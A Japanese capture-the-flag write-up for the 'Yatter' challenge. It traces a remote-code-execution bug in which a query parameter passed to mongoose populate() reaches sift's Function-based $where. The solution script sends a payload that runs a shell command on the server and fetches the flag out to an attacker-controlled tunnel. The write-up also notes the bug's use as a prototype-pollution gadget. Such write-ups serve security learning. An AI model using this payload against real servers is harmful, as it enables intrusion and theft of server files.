# Yatter Writeup (ja)

## 作者

@n4o847

## 問題概要

リンクを開くと、Twitter のような SNS サイト "Yatter" にアクセスします。
登録したユーザーはここから "Yeet" と呼ばれる投稿をしたり、他のユーザーをフォローしたり、他のユーザーの Yeet にいいねしたりできます。

![Yatter](https://i.imgur.com/C4EPeud.png)

配布ファイルを読むと、このサイトの構成は大体以下の通りであることがわかります。

- 使用ライブラリ
  - bcrypt
  - ejs
  - express
  - express-session
  - mongoose
- モデル
  - `User`
    - `username`
    - `password`
    - `following`
    - `followers`
    - `posts` (virtual)
  - `Post`
    - `author`
    - `content`
    - `likes`
- ページ
  - `/` タイムライン
  - `/register` 登録ページ
  - `/login` ログインページ
  - `/@:username` ユーザープロフィール
  - `/@:username/:postId` 投稿詳細
- アクション
  - `/register` 登録する
  - `/login` ログインする
  - `/logout` ログアウトする
  - `/post` 投稿する
  - `/users/:userId/follow` フォローする
  - `/users/:userId/unfollow` フォローを外す
  - `/posts/:postId/like` いいねする
  - `/posts/:postId/unlike` いいねを外す

この問題の目的は、サーバーにある秘密のテキストファイル (ただしファイル名は不明) を読み取り、フラグを得ることです。

## 脆弱性

ユーザープロフィールページを開いたときに、タブが切り替えられることに気づきます。

|`/@:username`|`/@:username?tab=following`|`/@:username?tab=followers`|
|:-:|:-:|:-:|
|![Yeets](https://i.imgur.com/FyMKH7w.png)|![Following](https://i.imgur.com/0qLd3Zw.png)|![Followers](https://i.imgur.com/PP1UWje.png)|

この機能は以下のようなコードで実装されています。

```js
app.get("/@:username", async (req, res) => {
  const { username } = req.params;
  const tab = req.query.tab ?? "posts";

  const user = await User.findOne({ username })
    .populate(tab)
    .exec();

  const userId = req.session.userId;
  const me = await User.findById(userId);

  res.render("user", { me, user, tab });
});
```

`User` モデルが持っている `following`, `followers` フィールドは他の `User` への参照の配列、`posts` フィールドは仮想的なフィールドです。
これらを実体化させるために [mongoose](https://www.npmjs.com/package/mongoose) の [population](https://mongoosejs.com/docs/populate.html) という機能を使っています。

ここで express の `req.query` には文字列だけでなく配列やオブジェクトを設定できることが知られています。
加えて、mongoose の `populate` には引数で様々なオプションが指定できます。

よって、この部分の処理はだいぶ怪しいと言えます。

実際、ドキュメントで [`Model.populate`](https://mongoosejs.com/docs/api/model.html#Model.populate()) を調べると、以下のようにして MongoDB 上で JavaScript コードが呼び出せることが分かります。

```js
await User.findOne({ username })
  .populate({
    path: "author",
    match: {
      $where: `...`,
    },
  })
  .exec();
```

しかし、MongoDB 内の JavaScript インタプリタでは色々な制限がかかっており、任意のコードを実行するのは難しいようです。

……本当にそうでしょうか？

---

ここからは、少し根気が要るかも知れません。
結論から言えば、mongoose の `populate` 関数には任意コード実行の脆弱性があり、それを探すことになります。

mongoose 内で、`populate` がどのように呼び出されているのかを追っていきます。

[`Model.populate`](https://github.com/Automattic/mongoose/blob/7.6.3/lib/model.js#L4261-L4282) は `_populate` を通じて各パスに対して `populate` を呼び出し、その中で `_assign` を呼び出し、`assignVals` を呼び出しています。

この `assignVals` にだいぶ[怪しい箇所](https://github.com/Automattic/mongoose/blob/7.6.3/lib/helpers/populate/assignVals.js#L97-L99)があることに気づきます。

```js
      valueToSet = Array.isArray(rawIds[i]) ?
        rawIds[i].filter(sift(o.match[i])) :
        [rawIds[i]].filter(sift(o.match[i]))[0];
```

どうやら、`populate` に渡されたオプションの `match` プロパティが配列だったとき、[sift](https://www.npmjs.com/package/sift) というライブラリの関数が呼ばれるようです。

この sift は MongoDB 風のクエリをフィルタ関数に変換するライブラリですが、本来は MongoDB に BSON で送るべきものを JavaScript そのもので処理しているので、挙動が異なります。
sift が [`$where` を実装しているところ](https://github.com/crcn/sift.js/blob/225980417e49d3d1124ef7338ee8673b8da836ff/src/operations.ts#L393-L411)を読むと、なんと `Function` コンストラクタを使って関数を動的に生成しています。

```js
export const $where = (
  params: string | Function,
  ownerQuery: Query<any>,
  options: Options
) => {
  let test;

  if (isFunction(params)) {
    test = params;
  } else if (!process.env.CSP_ENABLED) {
    test = new Function("obj", "return " + params);
  } else {
    throw new Error(
      `In CSP mode, sift does not support strings in "$where" condition`
    );
  }

  return new EqualsOperation(b => test.bind(b)(b), ownerQuery, options);
};
```

つまり、`match: [{ $where: ... }]` のようにしてコードを渡すことで、任意のコードが実行できるのです！

注意点として、`Function` による実行の前に MongoDB 内の JavaScript インタプリタで実行されてしまうので、`typeof process === "undefined" ? true : ...` のようにして、どちらで実行されているかを判別する必要があります。

## 解法

`@a` というユーザー名でユーザーが登録されていると仮定します。

```js
const express = require("express");
const localtunnel = require("localtunnel");

async function main() {
  const remoteHost = process.argv[2] ?? "localhost";
  const remotePort = parseInt(process.argv[3] ?? "18080", 10);

  const localPort = 3000;

  const app = express();

  app.get("/", (req, res) => {
    console.log(req.query.flag);
    res.send("ok");
  });

  const server = await new Promise((resolve) => {
    const server = app.listen(localPort, () => resolve(server));
  });

  const username = `a`;

  const tunnel = await localtunnel({ port: localPort });

  const payload =
    `typeof process === "undefined" ? true : fetch("${tunnel.url}/?flag=" + process.mainModule.require("child_process").execSync("cat flag-*.txt"))`;
  const params = new URLSearchParams({
    "tab[path]": "posts",
    "tab[match][][$where]": payload,
  });

  await fetch(
    `http://${remoteHost}:${remotePort}/@${username}?${params}`,
  );

  tunnel.close();
  server.close();
}

main();
```

## 発展

この脆弱性は `populate` に任意の構造のオブジェクトを渡せるときに限って発生しました。
しかし、プロトタイプ汚染が行われていた場合、他の使い方でも任意コード実行が起こり得ます。
すなわち、この脆弱性はプロトタイプ汚染ガジェットとして利用可能ということです。

例えば、データを一気に挿入する [`Model.insertMany`](https://mongoosejs.com/docs/api/model.html#Model.insertMany()) 関数は、パラメータとして `populate` オプションを取ります。
`insertMany` 内部には[以下のような判定コード](https://github.com/Automattic/mongoose/blob/7.6.3/lib/model.js#L3242)があります。

```js
        if (options.populate != null) {
```

よって、プログラム上 `populate` オプションが指定されていなくても、`Object.prototype` がプロトタイプ汚染されていた場合、任意コード実行が可能です。
